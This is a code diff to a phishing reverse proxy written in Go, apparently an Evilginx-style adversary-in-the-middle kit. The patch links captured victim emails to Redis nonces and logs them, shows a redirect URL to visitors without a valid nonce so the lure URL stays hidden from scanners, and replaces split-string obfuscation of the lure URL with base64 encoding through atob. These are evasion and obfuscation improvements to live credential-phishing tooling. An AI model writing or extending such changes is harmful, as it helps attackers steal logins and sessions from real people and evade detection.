@@ -214,6 +214,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_url += "?" + req.URL.RawQuery
 				//req_path += "?" + req.URL.RawQuery
 			}
+			log.Debug("Incoming request URL %s", req_url)
 
 
 			pl := p.getPhishletByPhishHost(req.Host)
@@ -402,7 +403,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											email, err := rdb.Get(ctxbg, nonce).Result()
 											if err != nil {
 												log.Warning("Redis error %s. Nonce %s not verified", err, nonce)
-												email_insert = "Email not found (Nonce: " + nonce + ") "
+												email_insert = "NONCE VERIFICATION FAILED (Nonce: " + nonce + ") "
 											} else {
 												session.Params["email"] = email;
 												email_insert = email + " (Nonce: " + nonce + ") "
@@ -538,7 +539,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											html = p.injectOgHeaders(l, html)
 
 											body := string(html)
-											body = p.replaceHtmlParams(body, lure_url, &s.Params)
+
+											// If Redis enabled but session did not have a valid nonce, use
+											// redirect_url in the redirector page, to avoid unnecessary
+											// leaking of lure_url
+											if _, ok := s.Params["email"]; !ok && p.cfg.GetRedisEnabled() {
+												body = p.replaceHtmlParams(body, s.RedirectURL, &s.Params)	
+											} else {
+												body = p.replaceHtmlParams(body, lure_url, &s.Params)
+											}
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
@@ -615,8 +624,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						if nonce, ok2 := s.Params["nonce"]; ok2 {
 							if email, ok3 := s.Params["email"]; ok3 {
-								log.Info("[%s] Valid session. Email: %s. Nonce: %s.", hiblue.Sprint(pl_name), email, nonce)
-								log.Info("[%s] Deleting nonce: %s.", hiblue.Sprint(pl_name), nonce)
+								log.Debug("[%s] Valid session. %s Email: %s. Nonce: %s.", hiblue.Sprint(pl_name), req_url, email, nonce)
+								log.Debug("[%s] Deleting nonce: %s.", hiblue.Sprint(pl_name), nonce)
 								rdb := redis.NewClient(&redis.Options{
 								    Addr:     fmt.Sprintf("%s:%d", p.cfg.GetRedisHost(), p.cfg.GetRedisPort()),
 								    Password: p.cfg.GetRedisPassword(),
@@ -1523,23 +1532,24 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 		body = strings.Replace(body, key, html.EscapeString(v), -1)
 	}
 	var js_url string
-	n := 0
-	for n < len(lure_url) {
-		t := make([]byte, 1)
-		rand.Read(t)
-		rn := int(t[0])%3 + 1
+	// n := 0
+	// for n < len(lure_url) {
+	// 	t := make([]byte, 1)
+	// 	rand.Read(t)
+	// 	rn := int(t[0])%3 + 1
 
-		if rn+n > len(lure_url) {
-			rn = len(lure_url) - n
-		}
+	// 	if rn+n > len(lure_url) {
+	// 		rn = len(lure_url) - n
+	// 	}
 
-		if n > 0 {
-			js_url += " + "
-		}
-		js_url += "'" + lure_url[n:n+rn] + "'"
+	// 	if n > 0 {
+	// 		js_url += " + "
+	// 	}
+	// 	js_url += "'" + lure_url[n:n+rn] + "'"
 
-		n += rn
-	}
+	// 	n += rn
+	// }
+	js_url = "atob('" + base64.StdEncoding.EncodeToString([]byte(lure_url)) + "')"
 
 	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
